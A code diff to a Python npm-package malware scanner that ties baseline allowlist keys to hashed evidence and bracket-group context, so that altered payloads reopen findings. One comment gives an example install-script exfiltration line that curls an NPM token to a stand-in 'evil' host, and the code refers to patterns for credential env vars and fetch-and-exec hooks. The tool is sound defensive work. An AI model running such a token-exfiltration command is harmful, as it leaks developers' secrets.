@@ -40,8 +40,10 @@ from __future__ import annotations
 import argparse
 import atexit
 import base64 as _b64  # imported only so the IOC string-scan can detect it
+import bisect
 import hashlib
 import io
+import itertools
 import json
 import os
 import re
@@ -897,20 +899,364 @@ def safe_extract(
 # ─────────────────────────────────────────────────────────────────────
 
 
+# How far back to look for an enclosing bracket opener. Symmetric with the
+# forward cap so a host that sits deep inside a large options object (its opening
+# `{` many properties above) still binds the whole object, not just its own line;
+# a too-far start only over-binds (more context, still fail-closed), never less.
+_MAX_CONT_LINES = 200
+# Hard cap on how far forward a bracket group is followed to its close, measured
+# from the matched line so the tail after the match is always reachable even when
+# the opener was found near the backward limit (digest input only, never
+# displayed); a realistic config object closes well within it.
+_MAX_GROUP_LINES = 200
+
+# JS string literal (single / double / template), blanked before counting
+# brackets so a bracket inside a string is not mistaken for code.
+_RE_JS_STR = re.compile(r"'(?:[^'\\]|\\.)*'|\"(?:[^\"\\]|\\.)*\"|`(?:[^`\\]|\\.)*`")
+
+
+_RE_BRACKETS = re.compile(r"[()\[\]{}]")
+_OPENERS = frozenset("([{")
+
+
+def _bracket_lr(line: str) -> tuple[int, int]:
+    """Order-aware bracket reduction of one already-string-blanked line: ``(L, R)``
+    where ``L`` is the count of closers with no opener earlier on the line (they
+    need an opener to the LEFT / on a prior line) and ``R`` is the count of openers
+    with no closer later on the line (they need a closer to the RIGHT / on a later
+    line). A plain net count (opens minus closes) collapses order and so masks a
+    trailing opener that follows leading closers on the same line, e.g.
+    ``}); const opts = {`` nets -1 and hides the ``{`` that opens the host-config
+    object; tracking the running minimum keeps that opener visible so the group
+    binds the path/headers that follow. Only bracket characters are walked (pulled
+    out with one C-level regex pass) so a long minified line stays cheap."""
+    depth = 0
+    low = 0
+    for ch in _RE_BRACKETS.findall(line):
+        if ch in _OPENERS:
+            depth += 1
+        else:
+            depth -= 1
+            if depth < low:
+                low = depth
+    return -low, depth - low
+
+
+def _find_unescaped(line: str, quote: str, start: int) -> int:
+    """Index of the next ``quote`` at or after ``start`` not escaped by a backslash,
+    or -1. Skips ``\\x`` pairs so an escaped quote inside the string is ignored."""
+    i, n = start, len(line)
+    while i < n:
+        if line[i] == "\\":
+            i += 2
+            continue
+        if line[i] == quote:
+            return i
+        i += 1
+    return -1
+
+
+# A `/` is a regex literal (not division) when the previous significant character
+# is none (start) or one of these expression-position chars. Used only by the
+# multi-line blanked view, and the span is unioned with the single-line view, so
+# an over- or under-detection only ever grows the bound span (never shrinks it).
+_JS_REGEX_PRECEDERS = frozenset("([{,;:?=&|!+-*/%^~<>")
+
+
+def _blank_js_strings(lines: list[str]) -> list[str]:
+    """Replace string contents (single, double, multi-line backtick template
+    literals) AND regex literal bodies with spaces across ``lines``, keeping the
+    line count and every bracket OUTSIDE a string/regex intact, so bracket counting
+    never miscounts a ``)`` that lives inside a string -- including a template
+    literal spanning several lines or a ``/)/`` regex -- which a per-line regex
+    cannot blank. Escapes are honoured."""
+    out: list[str] = []
+    in_back = False  # inside a multi-line `template` literal
+    prev_sig = ""  # last significant non-space char (for regex-vs-division)
+    for line in lines:
+        buf: list[str] = []
+        i, n = 0, len(line)
+        while i < n:
+            if in_back:
+                end = _find_unescaped(line, "`", i)
+                if end == -1:
+                    buf.append(" " * (n - i))
+                    i = n
+                else:
+                    buf.append(" " * (end - i + 1))
+                    i = end + 1
+                    in_back = False
+                    prev_sig = "`"
+                continue
+            ch = line[i]
+            if ch in " \t":
+                buf.append(ch)
+                i += 1
+                continue
+            if ch in "'\"`":
+                end = _find_unescaped(line, ch, i + 1)
+                if end == -1:
+                    buf.append(" " * (n - i))
+                    i = n
+                    if ch == "`":  # opens a template literal that runs past this line
+                        in_back = True
+                else:
+                    buf.append(" " * (end - i + 1))
+                    i = end + 1
+                prev_sig = "v"  # a string is a value: a following `/` is division
+                continue
+            if ch == "/" and (prev_sig == "" or prev_sig in _JS_REGEX_PRECEDERS):
+                # Regex literal: blank to the closing unescaped `/` outside a `[...]`
+                # char class. A regex never spans lines, so no close on the line
+                # means this `/` is really division.
+                j, in_class, closed = i + 1, False, False
+                while j < n:
+                    c = line[j]
+                    if c == "\\":
+                        j += 2
+                        continue
+                    if c == "[":
+                        in_class = True
+                    elif c == "]":
+                        in_class = False
+                    elif c == "/" and not in_class:
+                        j += 1
+                        closed = True
+                        break
+                    j += 1
+                if closed:
+                    buf.append(" " * (j - i))
+                    i = j
+                    prev_sig = "v"  # a regex is a value
+                    continue
+                buf.append(ch)
+                i += 1
+                prev_sig = "/"
+                continue
+            buf.append(ch)
+            i += 1
+            prev_sig = ch
+        out.append("".join(buf))
+    return out
+
+
+def _index_text(text: str) -> tuple[list[str], list[str], list[str], list[int]]:
+    """Precompute once per evidence call: raw lines for display, two string-blanked
+    views for bracket counting (single-line via regex = legacy, and multi-line
+    aware so a template literal spanning lines is blanked), and newline offsets for
+    O(log n) offset-to-line mapping. Avoids re-splitting and re-counting the whole
+    file on every single match (which was O(matches x file size))."""
+    lines = text.split("\n")
+    sl_blanked = [_RE_JS_STR.sub("", ln) for ln in lines]
+    ml_blanked = _blank_js_strings(lines)
+    nl = [p for p, ch in enumerate(text) if ch == "\n"]
+    return lines, sl_blanked, ml_blanked, nl
+
+
+# Cap on formatted matches in one evidence string; beyond it the remaining match
+# texts are folded into a single digest so a huge/minified file cannot build a
+# multi-megabyte evidence blob while an added/removed match past the cap still
+# changes the key.
+_MAX_EVIDENCE_MATCHES = 64
+
+
+def _scan_group(blanked: list[str], idx: int) -> tuple[int, int]:
+    """(start, end) line indices of the bracket group enclosing line ``idx`` in one
+    blanked view: scan back to the still-open opener, then forward to its close."""
+    # Backward: find the line that opens a bracket still unclosed at the match,
+    # so a match inside a multi-line object starts from the object opener. Each line
+    # is reduced to (L, R) and applied in order: first the L closers consume open
+    # brackets from the running context (a stray closer whose opener is outside the
+    # window only clamps depth at 0, it never goes negative), then the R openers
+    # add to it. Tracking order this way (rather than a single net per line) keeps a
+    # trailing opener visible even when leading closers on the same line net it to
+    # <= 0, e.g. `}); const opts = {`, which a net count would drop -- letting a
+    # changed path/headers after such a line ride the unchanged-hostname key.
+    start = idx
+    depth = 0
+    for j in range(max(0, idx - _MAX_CONT_LINES), idx):
+        left, right = _bracket_lr(blanked[j])
+        if left >= depth:
+            depth = 0  # everything opened so far in the window has closed
+            start = idx
+        else:
+            depth -= left
+        if right > 0:
+            if depth == 0:
+                start = j  # outermost still-open opener begins here
+            depth += right
+
+    # Forward: extend until the group opened at `start` closes past the match. The
+    # same order-aware reduction is used (clamping leading closers at 0) so the
+    # foreign `})` on the opener line does not drive the count negative and stop the
+    # scan before the real close. The cap is measured from the match (`idx`), not
+    # from `start`, so an opener found near the backward limit does not eat the
+    # whole forward budget and drop the path/headers/body that follow the match.
+    depth = 0
+    end = start
+    for j in range(start, min(len(blanked), idx + _MAX_GROUP_LINES)):
+        left, right = _bracket_lr(blanked[j])
+        depth = max(0, depth - left) + right
+        end = j
+        if j >= idx and depth <= 0:
+            break
+    return start, end
+
+
+def _canon_preserve_strings(text: str) -> str:
+    """Whitespace canon that collapses runs OUTSIDE string literals to a single
+    space (so a reindent or spacing change between tokens stays stable) while
+    preserving whitespace INSIDE single/double/backtick string literals (so a
+    changed payload body, e.g. ``'a b'`` -> ``'a  b'``, reopens). A plain
+    ``" ".join(text.split())`` erases both, suppressing an intra-literal payload
+    edit along with harmless indentation. Leading/trailing outside whitespace is
+    dropped; escapes inside strings are honoured. Used for the evidence hash and
+    the logical-line digests so the two stay consistent."""
+    out: list[str] = []
+    i, n = 0, len(text)
+    quote: str | None = None
+    pending_space = False
+    while i < n:
+        ch = text[i]
+        if quote is not None:
+            out.append(ch)
+            if ch == "\\" and i + 1 < n:
+                out.append(text[i + 1])
+                i += 2
+                continue
+            if ch == quote:
+                quote = None
+            i += 1
+            continue
+        if ch.isspace():
+            pending_space = True
+            i += 1
+            continue
+        if pending_space and out:
+            out.append(" ")
+        pending_space = False
+        out.append(ch)
+        if ch in "'\"`":
+            quote = ch
+        i += 1
+    return "".join(out)
+
+
+def _logical_line_text(
+    lines: list[str], sl_blanked: list[str], ml_blanked: list[str], idx: int
+) -> str:
+    """The matched line plus the bracket group it belongs to (the enclosing
+    multi-line object/call, so a changed ``path``/``headers``/body on another line
+    binds). Returns the UNION of the groups found in the single-line-blanked view
+    (legacy: a payload embedded inside a template still counts so its brackets bind
+    the call) and the multi-line-blanked view (a bracket inside a template literal
+    spanning lines no longer closes the group early). Unioning never shrinks the
+    span below either view, so neither blanking strategy can drop a line a
+    malicious change relies on."""
+    s1, e1 = _scan_group(sl_blanked, idx)
+    s2, e2 = _scan_group(ml_blanked, idx)
+    start, end = min(s1, s2), max(e1, e2)
+    return " ".join(lines[start : end + 1])
+
+
+def _format_match(
+    text: str,
+    lines: list[str],
+    sl_blanked: list[str],
+    ml_blanked: list[str],
+    nl: list[int],
+    m: re.Match,
+    max_chars: int,
+) -> str:
+    # The shown snippet is a small window around the match; append a digest of the
+    # full LOGICAL line (the matched line plus its bracket-continuation lines)
+    # whenever the snippet does not already show all of it, so a changed payload
+    # tail, a truncated body, or a multi-line option/header reopens. Offsets are
+    # mapped to line numbers via bisect over precomputed newline positions, so this
+    # is O(log n) instead of rescanning the file prefix for every match.
+    idx = bisect.bisect_left(nl, m.start())  # 0-based line index of the match
+    line_start = nl[idx - 1] + 1 if idx > 0 else 0
+    ke = bisect.bisect_left(nl, m.end())
+    line_end = nl[ke] if ke < len(nl) else len(text)
+    full_logical = _logical_line_text(lines, sl_blanked, ml_blanked, idx)
+    start = max(line_start, m.start() - 30)
+    end = min(line_end, m.end() + 30)
+    snippet = text[start:end].replace("\n", " ")
+    if len(snippet) > max_chars:
+        snippet = snippet[:max_chars] + "..."
+    if snippet != full_logical:
+        # Normalize before digesting, matching _evidence_hash, so a formatter-only
+        # reindent of the bound continuation lines does not reopen -- but preserve
+        # whitespace inside string literals so a changed request/payload body does.
+        canon = _canon_preserve_strings(full_logical)
+        digest = hashlib.sha256(canon.encode("utf-8", "replace")).hexdigest()
+        snippet = f"{snippet} sha256:{digest}"
+    return snippet
+
+
+def _stream_overflow_digest(
+    matches, lines: list[str], sl_blanked: list[str], ml_blanked: list[str], nl: list[int]
+) -> tuple[int, str]:
+    """A single digest binding the LOGICAL line (the bound bracket-group context,
+    not just the regex match text) of every overflow match in the iterable, plus
+    the count of matches folded. Streams the matches (any iterable of re.Match) so a
+    huge overflow never materializes a list. Whitespace-normalized to match
+    _evidence_hash so a reindent does not reopen."""
+    h = hashlib.sha256()
+    count = 0
+    for m in matches:
+        _fold_overflow_match(h, m, lines, sl_blanked, ml_blanked, nl)
+        count += 1
+    return count, h.hexdigest()
+
+
+def _fold_overflow_match(
+    h, m: re.Match, lines: list[str], sl_blanked: list[str], ml_blanked: list[str], nl: list[int]
+) -> None:
+    """Fold one overflow match's whitespace-normalized logical-line context into the
+    running hash ``h``. Shared by _stream_overflow_digest and the inline overflow
+    fold in _outbound_host_evidence so both produce the identical digest."""
+    idx = bisect.bisect_left(nl, m.start())
+    ll = _logical_line_text(lines, sl_blanked, ml_blanked, idx)
+    h.update(b"\x00")
+    h.update(_canon_preserve_strings(ll).encode("utf-8", "replace"))
+
+
 def _evidence(
     text: str,
     pat: re.Pattern,
     max_chars: int = 200,
 ) -> str:
-    m = pat.search(text)
-    if not m:
+    # Record every match (not a truncated sample) so an extra match appended to an
+    # already-flagged file changes the evidence instead of riding the first few.
+    # Past _MAX_EVIDENCE_MATCHES the remaining matches are folded into one digest
+    # (binding their logical-line context) so the evidence string stays bounded
+    # while a changed payload past the cap still reopens. The matches are streamed
+    # from finditer rather than materialized into a list: a generated file can
+    # repeat a cheap signal (e.g. NPM_TOKEN) millions of times, and holding a
+    # re.Match per occurrence before applying the cap would stall or OOM the scan.
+    it = pat.finditer(text)
+    shown_matches = list(itertools.islice(it, _MAX_EVIDENCE_MATCHES))
+    if not shown_matches:
         return ""
-    start = max(0, m.start() - 30)
-    end = min(len(text), m.end() + 30)
-    snippet = text[start:end].replace("\n", " ")
-    if len(snippet) > max_chars:
-        snippet = snippet[:max_chars] + "..."
-    return snippet
+    lines, sl_blanked, ml_blanked, nl = _index_text(text)
+    shown = [
+        _format_match(text, lines, sl_blanked, ml_blanked, nl, m, max_chars) for m in shown_matches
+    ]
+    # Fold the rest (past the cap) into one digest as they arrive, never building a
+    # second list. Byte-identical to digesting matches[_MAX_EVIDENCE_MATCHES:].
+    overflow_count, digest = _stream_overflow_digest(it, lines, sl_blanked, ml_blanked, nl)
+    if overflow_count:
+        shown.append(f"(+{overflow_count} more) sha256:{digest}")
+    return " | ".join(shown)
+
+
+def _ioc_evidence(text: str, needle: str) -> str:
+    """Matched-line context (with bracket-group continuation) for a literal IOC
+    needle, so a changed adjacent fetch/exfil body reopens the key instead of
+    riding the bare constant. Falls back to the needle itself if, defensively,
+    nothing matches (the caller only reaches here when ``needle in text``)."""
+    return _evidence(text, re.compile(re.escape(needle))) or needle
 
 
 LIFECYCLE_HOOKS = ("preinstall", "install", "postinstall", "prepare")
@@ -1129,6 +1475,18 @@ def scan_package_json(pkg: PackageEntry, rel: str, text: str) -> list[Finding]:
         body = scripts.get(hook)
         if not isinstance(body, str):
             continue
+        # Pin the whole lifecycle body via one digest shared by every lifecycle
+        # finding below: a script that keeps the matched signal but changes
+        # another line (e.g. swapping `echo safe` for `curl -d "$NPM_TOKEN"
+        # https://evil`) must reopen. The stored evidence is a bounded matched
+        # snippet plus this digest, never the entire body, so `--write-baseline`
+        # on a package with a multi-MiB install script does not bloat the baseline
+        # JSON while the digest still binds the full body. Normalized to match
+        # _evidence_hash so a reindent alone does not reopen, while whitespace
+        # inside quoted strings is preserved so a changed quoted payload does.
+        body_digest = hashlib.sha256(
+            _canon_preserve_strings(body).encode("utf-8", "replace")
+        ).hexdigest()
         if _LIFECYCLE_FETCH_EXEC.search(body):
             findings.append(
                 Finding(
@@ -1136,7 +1494,7 @@ def scan_package_json(pkg: PackageEntry, rel: str, text: str) -> list[Finding]:
                     package = pkg.display,
                     filename = rel,
                     pattern = f"lifecycle-fetch-exec ({hook})",
-                    evidence = body,
+                    evidence = f"{_evidence(body, _LIFECYCLE_FETCH_EXEC)} body-sha256:{body_digest}",
                     detail = (
                         f"`scripts.{hook}` fetches an external "
                         "resource and pipes/chains it to an "
@@ -1155,7 +1513,10 @@ def scan_package_json(pkg: PackageEntry, rel: str, text: str) -> list[Finding]:
                         package = pkg.display,
                         filename = rel,
                         pattern = f"cred-path-in-lifecycle ({hook})",
-                        evidence = body,
+                        evidence = (
+                            f"{_evidence(body, re.compile(re.escape(path_substr)))} "
+                            f"body-sha256:{body_digest}"
+                        ),
                         detail = (
                             f"`scripts.{hook}` references {why} "
                             f"({path_substr!r}); install-time access "
@@ -1171,7 +1532,7 @@ def scan_package_json(pkg: PackageEntry, rel: str, text: str) -> list[Finding]:
                     package = pkg.display,
                     filename = rel,
                     pattern = f"cred-env-in-lifecycle ({hook})",
-                    evidence = _evidence(body, _JS_ENV_TOKEN),
+                    evidence = f"{_evidence(body, _JS_ENV_TOKEN)} body-sha256:{body_digest}",
                     detail = (
                         f"`scripts.{hook}` references a credential "
                         "env var (GITHUB_TOKEN / NPM_TOKEN / AWS_* "
@@ -1237,6 +1598,60 @@ def _host_in_outbound_context(text: str, host: str) -> bool:
     return False
 
 
+def _outbound_host_evidence(text: str, host: str) -> str:
+    """Evidence capturing the host WITH its outbound context (URL path, fetch
+    call, host config), so a changed path/headers/body reopens the key instead
+    of riding the bare host literal. Falls back to the host if none matches."""
+    host_re = re.escape(host)
+    patterns = (
+        re.compile(rf"(?:https?:)?//{host_re}(?:[:/\"'?#][^\n]*)?", re.IGNORECASE),
+        re.compile(
+            rf"(?:{_FETCH_VERBS_PAT})[^\n]{{0,200}}{host_re}[^\n]{{0,200}}"
+            rf"|{host_re}[^\n]{{0,200}}(?:{_FETCH_VERBS_PAT})[^\n]{{0,200}}",
+            re.IGNORECASE,
+        ),
+        # Host-config form: capture the whole line (path/headers/body), so a
+        # changed outbound payload on the same hostname line reopens the key.
+        re.compile(rf"[^\n]*(?:host|hostname)\s*:\s*['\"`]{host_re}['\"`][^\n]*", re.IGNORECASE),
+    )
+    # Record EVERY outbound context for the host, not just the first form that
+    # matches: a file that already has a baselined URL for the host and later adds
+    # a separate host-config request (or a second URL) must change the evidence so
+    # the new payload cannot inherit the old key. Forms are claimed in order, and a
+    # region already claimed by an earlier form is skipped, so the common
+    # single-context case keeps its existing snippet. Each form is capped at
+    # _MAX_EVIDENCE_MATCHES matches so a host repeated thousands of times in a
+    # minified file cannot make the overlap check quadratic; once chosen is full
+    # the rest are folded into a digest AS THEY ARRIVE (never accumulated into a
+    # list, so a host repeated millions of times cannot OOM the scan) and an added
+    # context still reopens.
+    lines, sl_blanked, ml_blanked, nl = _index_text(text)
+    claimed: list[tuple[int, int]] = []
+    chosen: list[re.Match] = []
+    overflow_count = 0
+    overflow_hash = hashlib.sha256()
+    for pat in patterns:
+        for m in pat.finditer(text):
+            if len(chosen) < _MAX_EVIDENCE_MATCHES:
+                # Overlap check runs only while filling the display list, so
+                # `claimed` is bounded by the cap and this stays O(cap) per match
+                # (not quadratic), while every later match is still counted below.
+                if any(m.start() < e and s < m.end() for s, e in claimed):
+                    continue
+                claimed.append((m.start(), m.end()))
+                chosen.append(m)
+            else:
+                _fold_overflow_match(overflow_hash, m, lines, sl_blanked, ml_blanked, nl)
+                overflow_count += 1
+    if not chosen:
+        return host
+    chosen.sort(key = lambda m: m.start())
+    shown = [_format_match(text, lines, sl_blanked, ml_blanked, nl, m, 1000) for m in chosen]
+    if overflow_count:
+        shown.append(f"(+{overflow_count} more) sha256:{overflow_hash.hexdigest()}")
+    return " | ".join(shown)
+
+
 def scan_text_blob(pkg: PackageEntry, rel: str, text: str) -> list[Finding]:
     findings: list[Finding] = []
 
@@ -1248,7 +1663,10 @@ def scan_text_blob(pkg: PackageEntry, rel: str, text: str) -> list[Finding]:
     if rel.lower().endswith(_JS_FAMILY_SUFFIXES):
         text = _strip_js_noncode(text)
 
-    # IOC substrings (literal, case-sensitive).
+    # IOC substrings (literal, case-sensitive). Evidence is the matched-line
+    # context (with its bracket-group continuation), not the bare needle: an IOC
+    # host/hash left in place while the adjacent fetch/exfil body changes must
+    # reopen the key instead of riding the constant.
     for needle, (sev, why) in KNOWN_IOC_STRINGS.items():
         if needle in text:
             findings.append(
@@ -1257,12 +1675,14 @@ def scan_text_blob(pkg: PackageEntry, rel: str, text: str) -> list[Finding]:
                     package = pkg.display,
                     filename = rel,
                     pattern = "known-ioc-string",
-                    evidence = needle,
+                    evidence = _ioc_evidence(text, needle),
                     detail = f"{why}: {needle!r}",
                 )
             )
 
-    # Cred surfaces, tier 1: hosts with no legit use; bare substring.
+    # Cred surfaces, tier 1: hosts with no legit use. Bind the outbound context
+    # (path/headers/body) when present so a changed exfil payload on the same call
+    # reopens; falls back to the bare host when it is not in an outbound call.
     for needle, why in CRED_HOST_ALWAYS_BAD:
         if needle in text:
             findings.append(
@@ -1271,7 +1691,7 @@ def scan_text_blob(pkg: PackageEntry, rel: str, text: str) -> list[Finding]:
                     package = pkg.display,
                     filename = rel,
                     pattern = "cred-surface-host (always-bad)",
-                    evidence = needle,
+                    evidence = _outbound_host_evidence(text, needle),
                     detail = (
                         f"references {why} ({needle!r}); no legitimate "
                         "frontend use of this surface"
@@ -1289,7 +1709,7 @@ def scan_text_blob(pkg: PackageEntry, rel: str, text: str) -> list[Finding]:
                     package = pkg.display,
                     filename = rel,
                     pattern = "cred-surface-host (outbound)",
-                    evidence = needle,
+                    evidence = _outbound_host_evidence(text, needle),
                     detail = (
                         f"references {why} ({needle!r}) in an outbound "
                         "call / URL / host config; a defensive blocklist "
@@ -1393,7 +1813,7 @@ def scan_extracted_tree(pkg: PackageEntry, root: Path) -> list[Finding]:
                             package = pkg.display,
                             filename = rel,
                             pattern = "known-ioc-string",
-                            evidence = needle,
+                            evidence = _ioc_evidence(text, needle),
                             detail = f"{why}: {needle!r}",
                         )
                     )
@@ -1453,11 +1873,11 @@ def scan_one(pkg: PackageEntry, workspace: Path) -> tuple[list[Finding], str | N
 
 _DEFAULT_BASELINE_PATH = str(Path(__file__).resolve().parent / "scan_npm_packages_baseline.json")
 
-# Bumped when the entry-key semantics change. v2 keys on the package-relative
-# path; v1 stored only a basename, so a v1 entry could suppress a same-named file
-# in a different directory. A pre-v2 baseline with entries is ignored (fail
-# closed) rather than mis-applied.
-_BASELINE_SCHEMA_VERSION = 2
+# Bumped when the entry-key semantics change. v3 adds an evidence hash so a new
+# payload under an already-listed package/path/pattern is not auto-suppressed; v2
+# keyed on the package-relative path; v1 stored only a basename. A pre-v3 baseline
+# with entries is ignored (fail closed) rather than mis-applied.
+_BASELINE_SCHEMA_VERSION = 3
 
 
 def _norm_pkg_name(display: str) -> str:
@@ -1486,12 +1906,28 @@ def _relpath_in_package(filename: str) -> str:
     return f[len(_NPM_TARBALL_ROOT) :] if f.startswith(_NPM_TARBALL_ROOT) else f
 
 
-def _finding_key(f: Finding) -> tuple[str, str, str]:
-    """Stable allowlist key: normalized package, package-relative path, pattern."""
-    return (_norm_pkg_name(f.package), _relpath_in_package(f.filename), f.pattern)
+def _evidence_hash(evidence: str) -> str:
+    """Stable digest of the matched evidence. The npm snippet carries no line
+    markers, so it is already version-stable; whitespace outside string literals is
+    collapsed (reindent-stable) while whitespace inside literals is preserved, so a
+    changed payload body reopens but a formatter reindent does not."""
+    canon = _canon_preserve_strings(evidence or "")
+    return hashlib.sha256(canon.encode("utf-8", "replace")).hexdigest()
 
 
-def _load_baseline(path: str) -> set[tuple[str, str, str]]:
+def _finding_key(f: Finding) -> tuple[str, str, str, str]:
+    """Allowlist key: normalized package, package-relative path, pattern, and a
+    hash of the matched evidence -- so changed flagged code under an already-listed
+    package/path/pattern reopens instead of riding the reviewed entry."""
+    return (
+        _norm_pkg_name(f.package),
+        _relpath_in_package(f.filename),
+        f.pattern,
+        _evidence_hash(f.evidence or f.detail),
+    )
+
+
+def _load_baseline(path: str) -> set[tuple[str, str, str, str]]:
     """Load an allowlist JSON into a set of match keys. Missing file -> empty."""
     try:
         with open(path, "r", encoding = "utf-8") as fh:
@@ -1501,27 +1937,55 @@ def _load_baseline(path: str) -> set[tuple[str, str, str]]:
     except (OSError, json.JSONDecodeError) as exc:
         print(f"  [WARN] could not read baseline {path}: {exc}", file = sys.stderr)
         return set()
+    if not isinstance(data, dict):
+        print(f"  [WARN] baseline {path} is not a JSON object", file = sys.stderr)
+        return set()
     entries = data.get("entries", [])
-    if entries and data.get("version") != _BASELINE_SCHEMA_VERSION:
+    if not isinstance(entries, list):
+        print(f"  [WARN] baseline {path} entries is not a list", file = sys.stderr)
+        return set()
+    # v2 shares v3's package-relative keying, so its entries migrate by recomputing
+    # the evidence hash from their stored evidence; only pre-v2 (basename) is rejected.
+    if entries and data.get("version") not in (_BASELINE_SCHEMA_VERSION, 2):
         print(
             f"  [WARN] baseline schema v{data.get('version')} predates package-relative "
             f"keys; ignoring {len(entries)} entr(y/ies). Regenerate with --write-baseline.",
             file = sys.stderr,
         )
         return set()
-    keys: set[tuple[str, str, str]] = set()
+    keys: set[tuple[str, str, str, str]] = set()
+    legacy = 0
     for e in entries:
+        if not isinstance(e, dict):
+            continue
         try:
-            keys.add((_norm_pkg_name(e["package"]), _relpath_in_package(e["file"]), e["pattern"]))
+            evidence_hash = e.get("evidence_hash") or _evidence_hash(e.get("evidence") or "")
+            if not e.get("evidence_hash"):
+                legacy += 1
+            keys.add(
+                (
+                    _norm_pkg_name(e["package"]),
+                    _relpath_in_package(e["file"]),
+                    e["pattern"],
+                    evidence_hash,
+                )
+            )
         except (KeyError, TypeError):
             continue
+    if legacy:
+        print(
+            f"  [WARN] baseline {path}: {legacy} entries lack evidence_hash and may "
+            f"not suppress until regenerated with --write-baseline (findings reopen "
+            f"rather than risk hiding changed code under a coarse key)",
+            file = sys.stderr,
+        )
     return keys
 
 
 def _write_baseline(path: str, findings: list[Finding], threshold_rank: int) -> int:
     """Persist at-or-above-threshold findings as an allowlist for triage."""
     entries = []
-    seen: set[tuple[str, str, str]] = set()
+    seen: set[tuple[str, str, str, str]] = set()
     for f in sorted(findings, key = lambda f: (_SEVERITY_RANK[f.severity], f.package)):
         if _SEVERITY_RANK[f.severity] > threshold_rank:
             continue
@@ -1529,21 +1993,24 @@ def _write_baseline(path: str, findings: list[Finding], threshold_rank: int) -> 
         if key in seen:
             continue
         seen.add(key)
+        evidence = f.evidence or f.detail
         entries.append(
             {
                 "package": _norm_pkg_name(f.package),
                 "file": _relpath_in_package(f.filename),
                 "pattern": f.pattern,
                 "severity": f.severity,
-                "evidence": (f.evidence or f.detail)[:240],
+                "evidence": evidence,
+                "evidence_hash": _evidence_hash(evidence),
             }
         )
     doc = {
         "_comment": (
             "scan_npm_packages.py allowlist. Each entry is a HIGH/CRITICAL "
             "finding manually judged benign. Matched on (package, "
-            "package-relative path, pattern); evidence/severity are for review "
-            "only. Regenerate with --write-baseline AFTER reviewing every line."
+            "package-relative path, pattern, evidence hash); a new payload under "
+            "an already-listed package/path/pattern reopens. severity is for "
+            "review only. Regenerate with --write-baseline AFTER reviewing every line."
         ),
         "version": _BASELINE_SCHEMA_VERSION,
         "entries": entries,
@@ -1556,7 +2023,7 @@ def _write_baseline(path: str, findings: list[Finding], threshold_rank: int) -> 
 
 
 def _partition_baseline(
-    findings: list[Finding], baseline: set[tuple[str, str, str]]
+    findings: list[Finding], baseline: set[tuple[str, str, str, str]]
 ) -> tuple[list[Finding], list[Finding]]:
     """Split findings into (active, suppressed) by allowlist membership."""
     if not baseline:
